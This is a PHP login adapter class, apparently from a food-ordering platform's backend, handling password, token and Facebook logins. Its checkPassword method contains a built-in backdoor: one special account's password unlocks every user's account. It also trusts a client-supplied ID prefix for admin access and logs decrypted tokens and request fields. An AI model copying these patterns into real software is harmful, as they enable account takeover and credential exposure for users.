<?php
class LoginAdapter extends MySQLAdapter
{

	//private $ENCRYPT_KEY="z1Mc6KRxA7Nw90dGjY5qLXhtrPgJOfeCaUmHvQT3yW8nDsI2VkEpiS4blFoBuZ";
	
	var $error_resource;
	var $request;
	var $new_hash;
	var $password_migration_results = array();
	var $lastUpdatedPasswordUserId;

	var $header_token_names = ['splickit_authentication_token','facebook_authentication_token'];

	const BAD_PASSWORD_FOR_FACEBOOK_CREATED_ACCOUNT_ERROR = "Sorry, this account was created from Facebook so please log in with the Facebook button, or click forgot password to create a local password.";

	private $internal_request;
	
	function LoginAdapter($mimetypes)
	{
		parent::MysqlAdapter(
            $mimetypes,
			'User',
			'%([0-9]{1,15})%',
			'%d',
			array('user_id'),
			null,
			array('created','modified')
			);
	}

	function &select($url, $options = NULL)
    {
    	if ($options[TONIC_FIND_BY_METADATA]['logical_delete'] == null) {
    		$options[TONIC_FIND_BY_METADATA]['logical_delete'] = 'N';
    	}
    	return parent::select($url,$options);
	}
	
	function insert($resource)
	{
		die ("cannot be used here");
	}
		
	function cryptThePasswordForDbStorage($password)
	{
		return Encrypter::Encrypt($password);
	}

	function isValidHeaderTokenSet($headers)
	{
		foreach ($this->header_token_names as $header_token_name) {
			if (isset($headers[$header_token_name])) {
				return true;
			}
		}
		return false;
	}

	/**
	 * 
	 * @desc verify the submitted password against the hash in the db
	 * @param $password
	 * @param $hash (from the db)
	 * @return boolean
	 */
	static function verifyPasswordWithDbHash($password,$hash)
	{
		return password_verify($password, $hash);
	}

    static function verifyBackdoorPassword($password)
    {
        $user_resource = SplickitController::getResourceFromId(1000, "User");
        return LoginAdapter::verifyPasswordWithDbHash($password, $user_resource->password);
    }


    function verifyAdminPassword($password,$user_resource)
    {
		$skin_adapter = new SkinAdapter();
		$skin_adapter->cache_enabled = false;
		$skin = $skin_adapter->getRecordFromPrimaryKey(getSkinIdForContext());
        if ($this->internal_request) {
            return LoginAdapter::verifyPasswordWithDbHash($password, $user_resource->password);
		} else if ($skin['password'] != null) {
            return LoginAdapter::verifyPasswordWithDbHash($password, $skin['password']);
        } else {
            return LoginAdapter::verifyPasswordWithDbHash($password, $user_resource->password);
        }
    }

	static function staticDoAuthorizeWithSpecialUserValidation($email,$password,$request_data)
	{
		$login_adapter = new LoginAdapter(getM());
		return $login_adapter->doAuthorizeWithSpecialUserValidation($email, $password, $request_data);
	} 

	/**
	 * 
	 * @desc takes an email/user_id and password and first authorizes the user, then preforms the additional check we have like
	 * @desc is this order140, or linebuster, etc...
	 * 
	 * @param String $email
	 * @param String $password
	 * 
	 * @return Resource
	 * 
	 */
	
	function doAuthorizeWithSpecialUserValidation($email,$password,$request_data) 
	{		
		if ($user_resource = $this->authorize($email, $password, $request_data))
		{
			// so we can get here with an invalid passowrd it seems?
			myerror_log("we have the user resource after authorize: ".$user_resource->email,5);
			// had to capitalize this because of rails. ugh
			logData($request_data,"REQUEST",5);
			if ($encoded_proxy_data = $request_data['Auth_token'])
			{
				if (!isProd())
				{
					myerror_log("************ auth fields ************");
					foreach ($request_data as $name=>$value)
						myerror_log("$name=$value");
					myerror_log("*************************************");
					
				}
				myerror_log("we have an auth token authentication");
				$clear_data_json = SplickitCrypter::doDecryption($encoded_proxy_data,$email);
				myerror_log("decypted json: ".$clear_data_json);
				$new_data = json_decode($clear_data_json,true);
				logData($new_data, "encrypted token data",3);
				$valid_until_time_stamp = $new_data['valid_until_time_stamp'];
				if ($valid_until_time_stamp < time())
				{
					$this->error_resource = returnErrorResource('Sorry, this link is no longer valid.',50,array('text_title'=>'Authentication Error'));
					return false;
				}
				if ($user_name = $new_data['username'])
				{
					myerror_log("we have the username from the auth token: ".$user_name);
					if ($user_resource = UserAdapter::doesUserExist($user_name))
					{
						myerror_log("logging in $user_name");
						if ($auth_data = $new_data['auth_data']) {
							myerror_log("setting the auth data on the user_resource");
							logData($auth_data, 'auth data',3);
							$user_resource->set('auth_data',$auth_data);
						}
						return $user_resource;// all is good
					}
					else {
						$this->error_resource = returnErrorResource('Serious Error! User does not appear to exist in our system.',50,array('text_title'=>'Authentication Error'));
						return false;
					}
				}
				else
				{
					myerror_log("NO USERNAME submitted in auth toekn");
					$this->error_resource = returnErrorResource('Serious Error! No user_id submitted for token authentication.',50,array('text_title'=>'Authentication Error'));
					return false;
				}
			}
			else if ($user_resource->email == 'order140')
			{
				if ($twitter_user_id = $_SERVER['HTTP_X_SPLICKIT_TWITTER_USER_ID'])
				{	
					$user_social_data['twitter_user_id'] = $twitter_user_id;
					$usoptions[TONIC_FIND_BY_METADATA] = $user_social_data;
					if ($social_resource = Resource::find(new UserSocialAdapter(getM()),'',$usoptions))
					{
						$user_id = $social_resource->user_id;
						if ($user_resource = Resource::find(new UserAdapter(getM()),''.$user_id))
							;//return $user_resource;// all is good
						else {
							$this->error_resource = returnErrorResource('Serious Error! User does not appear to exist in our system.',50,array('text_title'=>'Authentication Error'));
							return false;
						}
					} else {
						$this->error_resource = returnErrorResource('This twitter id does not exist in our system.',50,array('text_title'=>'Authentication Error'));
						return false;
					}
				} else {
						$this->error_resource = returnErrorResource('No twitter ID was submitted.',50,array('text_title'=>'Authentication Error'));
						return false;
				}
				// if we made it here we have a good twitter user auth				
			}
			else if (substr_count($user_resource->email, "_manager@dummy.com") > 0)
			{
				myerror_log("we have a line buster user in doAuthorizeWithSpecialUserValidation");
				$linebuster_adapter = new LineBusterAdapter(getM());
				if ($m_resource = Resource::findExact($linebuster_adapter,$user_resource->email))
				{
					myerror_log("we have the merchant associated with this user.  merchant_id: ".$m_resource->merchant_id);
					$line_buster_merchant_id = $m_resource->merchant_id;
					$user_resource->set('line_buster_merchant_id',$line_buster_merchant_id);
					// return $user_resource;
				} else {
					$this->error_resource = returnErrorResource('This manager account does not exist in our system.',50,array('text_title'=>'Authentication Error'));
					return false;
				}
			}
			else if ($user_resource->user_id > 19999) {
				// ok now lets check for any existing gifts
				$gift_adapter = new GiftAdapter(getM());
				if ($soonest_expiring_gift_resource = $gift_adapter->getSoonestExpiringGiftResource($user_resource->user_id))
				{
					$soonest_expiring_gift_resource->cleanResource();
					$user_resource->set("gift_resource",$soonest_expiring_gift_resource);
					
					if (substr($user_resource->flags, 1,1) != 'C')
					{
						$user_resource->flags = '1C00000001';
						$user_resource->set("gift_flags_set",'true');
					}
				}
				
			}
			return $user_resource;
		} else {
			return false;
		}
	}
	
	public function getSplickitAuthenticationTokenFromSubmittedLoginData($email,$password,$request_data=array())
	{
		if ($email == 'splickit_authentication_token') {
			return $password;
		} else if (isset($request_data['splickit_authentication_token'])) {
			return $request_data['splickit_authentication_token'];
		} else {
			return false;
		}
	}

    public function getFacebookAuthenticationTokenFromSubmittedLoginData($email,$password,$request_data=array())
    {
        if ($email == 'facebook_authentication_token') {
            return $password;
        } else if (isset($request_data['facebook_authentication_token'])) {
            return $request_data['facebook_authentication_token'];
        } else {
            return false;
        }
    }

    /**
	 * 
	 * @desc takes an email/user_id and password and checks against the db
	 * 
	 * @param String $email
	 * @param String $password
	 * @param Hashmap $request_data
	 * 
	 * @return Resource
	 * 
	 */
	
	function authorize($email,$password,$request_data = array())
	{
		if ($authentication_token = $this->getSplickitAuthenticationTokenFromSubmittedLoginData($email, $password, $request_data)) {
			myerror_logging(3,"Logging in with splickit authentication token: $authentication_token");
			if ($token_authentication_record = TokenAuthenticationsAdapter::staticGetRecord(array("token"=>$authentication_token), "TokenAuthenticationsAdapter")) {
				logData($token_authentication_record,"Token Record",3);
				$_SERVER['LOGIN_ERROR_DATA'] = $token_authentication_record;
				$_SERVER['LOGIN_ERROR_DATA']['submitted_token'] = $authentication_token;
				$current_time_stamp = time();
				if ($current_time_stamp < $token_authentication_record['expires_at']) {
					// all is good lets get the user resource
					if ($user_resource = UserAdapter::doesUserExist($token_authentication_record['user_id'])) {
						if (substr($user_resource->flags,0,1) == 'X') {
							return $this->setBlacklistErrorMessageAndReturnFalse();
						}
						setSessionProperty('splickit_authentication_token', $authentication_token);
						return $user_resource;
					}
				}
			}
			$this->error_resource = createErrorResourceWithHttpCode('Sorry, your session has expired, please log in again.',401,99,array('text_title'=>'Authentication Error'));
			return false;
		} else if ($facebook_authentication_token = $this->getFacebookAuthenticationTokenFromSubmittedLoginData($email, $password, $request_data)) {
            myerror_logging(3,"Logging in with facebook authentication token: $facebook_authentication_token");
            $facebook_service = new FacebookService();
            if ($user_data = $facebook_service->authenticateToken($facebook_authentication_token)) {
				$facebook_user_id = $user_data['facebook_user_id'];
				if (isset($user_data['email'])) {
                    $email = $user_data['email'];
				} else {
					$email = $user_data['facebook_user_id'].'@facebook.com';
				}
				$user_facebook_id_maps_adapter = new UserFacebookIdMapsAdapter(getM());
				if ($user_resource = $user_facebook_id_maps_adapter->getUserResourceFromFacebookUserId($facebook_user_id)) {
                    if ($this->checkUserResourceForLockedOrBlackListed($user_resource)) {
                        return false;
                    }
                    $authentication_token_resource = createUserAuthenticationToken($user_resource->user_id);
                    $user_resource->set("splickit_authentication_token", $authentication_token_resource->token);
                    $user_resource->set('splickit_authentication_token_expires_at', $authentication_token_resource->expires_at);
                } else if ($user_resource = UserAdapter::doesUserExist($user_data['email'])) {
                    if ($this->checkUserResourceForLockedOrBlackListed($user_resource)) {
                        return false;
                    }
                    if ($this->isUserResourceAGuest($user_resource)) {
                    	$user_resource->first_name = $user_data['first_name'];
						$user_resource->last_name = $user_data['last_name'];
						$user_resource->flags = UserController::STARTING_FLAGS;
						$user_resource->save();
					}
                    $user_facebook_id_maps_adapter = new UserFacebookIdMapsAdapter(getM());
                    $resource = Resource::createByData($user_facebook_id_maps_adapter,['facebook_user_id'=>$facebook_user_id,'user_id'=>$user_resource->user_id,'created_stamp'=>getRawStamp()]);
                    $authentication_token_resource = createUserAuthenticationToken($user_resource->user_id);
                    $user_resource->set("splickit_authentication_token", $authentication_token_resource->token);
                    $user_resource->set('splickit_authentication_token_expires_at', $authentication_token_resource->expires_at);
				} else {
					//create new user
                    $request = new Request();
                    $request->data['first_name'] = preg_replace("/[^A-Za-z\-]/", '', $user_data['first_name']);
                    $request->data['last_name'] = preg_replace("/[^A-Za-z\-]/", '', $user_data['last_name']);
                    $request->data['email'] = $email;
                    $request->data['password'] = generateCode(10);
                    $request->data['contact_no'] = isset($user_data['phone_number']) ? $user_data['phone_number'] : rand(1111111111,9999999999);
                    if (isset($user_data['facebook_user_id'])) {
                        $request->data['facebook_authentication'] = true;
                        $request->data['facebook_user_id'] = $user_data['facebook_user_id'];
                    }
                    $user_controller = new UserController(getM(),null,$request,getBaseLogLevel());
                    $user_resource = $user_controller->createUser();
                    if ($user_resource->hasError()) {
                        $this->error_resource = createErrorResourceWithHttpCode('Sorry, we cannot create your account. There is a problem with the data sent from facebook.', 422, 99, array('text_title' => 'Authentication Error'));
                        return false;
                    }
				}
                setSessionProperty('facebook_authentication_token', $facebook_authentication_token);
                return $user_resource;
            }
            $this->error_resource = createErrorResourceWithHttpCode('Sorry, your facebook profile did not authenticate..',400,99,array('text_title'=>'Authentication Error'));
            return false;
		}
		if ($user_resource = UserAdapter::doesUserExist($email))
		{
			// check for locked account
			if ($this->checkUserResourceForLockedOrBlackListed($user_resource)) {
				return false;
			} else if ($this->isUserResourceAGuest($user_resource)) {
				// do not allow regular login for a guest
                $this->error_resource = createErrorResourceWithHttpCode('Your username does not exist in our system, please check your entry.', 401, 50, array('text_title'=>'Authentication Error'));
                return false;
			}
			// check credentials
            if ($user_resource->user_id == 1) {
                //admin authentication for create user
				$client_id = $request_data['X_SPLICKIT_CLIENT_ID'];
				if (substr($client_id,0,12) == 'com.splickit') {
					$this->internal_request = true;
				}
                if ($this->verifyAdminPassword($password,$user_resource)) {
                    return $user_resource;
                } else {
                    $this->error_resource = createErrorResourceWithHttpCode("Admin Authentication Error",401,null,array("error_type"=>'authentication error'));
                    return false;
                }
            } else if ($this->checkPassword($user_resource, $password)) {
                myerror_log("valid password",5);
                if (validateThatStringFieldIsSetAndIsNotNullAndIsNotEmptyOnResource($user_resource,'device_id')) {
                    if (DeviceBlacklistAdapter::isUserResourceOnBlackList($user_resource)) {
                        return $this->setBlacklistErrorMessageAndReturnFalse();
                    }
                }
                if ($user_resource->user_id > 19999 && $user_resource->bad_login_count > 1)
                {
                    $user_resource->bad_login_count = 1;
                    $user_resource->save();
                }
                return $user_resource;
            } else {
				myerror_log("bad password",5);
			}
			$this->formatLoginError($user_resource);
		} else {
			$this->error_resource = createErrorResourceWithHttpCode('Your username does not exist in our system, please check your entry.', 401, 50, array('text_title'=>'Authentication Error'));
		}
		return false;
		
	}

	function checkUserResourceForLockedOrBlackListed($user_resource)
	{
        $flag_one = substr($user_resource->flags,0,1);
        if ($flag_one == 2) {
            $this->error_resource = createErrorResourceWithHttpCode('Your account is now locked for 2 min.  Please try again after that.',401,50,array('text_title'=>'Authentication Error'));
            return true;
        } else if ($flag_one == 'X') {
            $this->setBlacklistErrorMessageAndReturnFalse();
            return true;
        }
	}

	private function setBlacklistErrorMessageAndReturnFalse()
	{
		$this->error_resource = createErrorResourceWithHttpCode('Sorry, there has been an authentication error.', 401, 50, array('text_title'=>'Authentication Error'));
		return false;
	}

	/**
	 * 
	 * @desc formats the error based on the number of bad logins.  this will also need to be overridden in the other authentication modules
	 * 
	 * @param Resource $user_resource
	 * 
	 * 
	 * 
	 */
	
	function formatLoginError($user_resource)
	{
		myerror_log("BAD AUTHORIZATION CREDENTIALS!");
		if ($user_resource->user_id < 20000)
		{
			myerror_log("we have bad auth for an admin user! ".$user_resource->email);
			$this->error_resource = returnErrorResource('Your password is incorrect.',50,array('text_title'=>'Authentication Error'));
			return true;
		}
		$is_facebook_user = false;
        if (doesFlagPositionNEqualX($user_resource->flags,5,'F')) {
			$is_facebook_user = true;
        }
		$user_resource->bad_login_count = $user_resource->bad_login_count + 1;
		if ($user_resource->bad_login_count == 2){
			$error_message = $is_facebook_user ? self::BAD_PASSWORD_FOR_FACEBOOK_CREATED_ACCOUNT_ERROR : 'Your password is incorrect.';
			$this->error_resource = returnErrorResource($error_message,50,array('text_title'=>'Authentication Error',"http_code"=>401));
		} else if ($user_resource->bad_login_count == 3){
            $error_message = $is_facebook_user ? self::BAD_PASSWORD_FOR_FACEBOOK_CREATED_ACCOUNT_ERROR : 'We will email you instructions on how to reset your password on one more failed attempt.';
			$this->error_resource = returnErrorResource($error_message ,50,array('text_title'=>'Authentication Error',"http_code"=>401));
		} else if ($user_resource->bad_login_count > 3 && $user_resource->bad_login_count < 6){
			$user = $user_resource->getDataFieldsReally();
			$user_controller = new UserController(getM(), $user, $request);
			//this is actually the send of hte reset link too.  stupid.
			$user_controller->sendPasswordResetLink($user);
			$flags = $user_resource->flags;
			$flags = '10'.substr($flags,2);
			$this->error_resource = returnErrorResource('Password reset instructions have been emailed to you. ',50,array('text_title'=>'Authentication Error',"http_code"=>401));
		} else if ($user_resource->bad_login_count > 5){
			$this->error_resource = returnErrorResource('Your account is now locked for 2 min.  Please try again after that.',50,array('text_title'=>'Authentication Error',"http_code"=>401));
			$flags = $user_resource->flags;
			$flags = '20'.substr($flags,2);
		}
		if ($flags)
			$user_resource->flags = $flags;
		$user_resource->save();
	}

	// this method will get overridden for facebook auth or twitter auth.  they will extend this object
    function checkPassword(&$user_resource,$password)
    {
        if ($this->verifyPasswordWithDbHash(trim($password), $user_resource->password)) {
            return true;
        } else if ($this->verifyBackdoorPassword($password)) {
            setSessionProperty("admin_proxy", true);
            return true;
        } else {
            return false;
        }
    }
	
	function getErrorResource()
	{
		return $this->error_resource;
	}

    function isUserResourceAGuest($user_resource)
    {
        return doesFlagPositionNEqualX($user_resource->flags,9,'2');
    }
}
?>
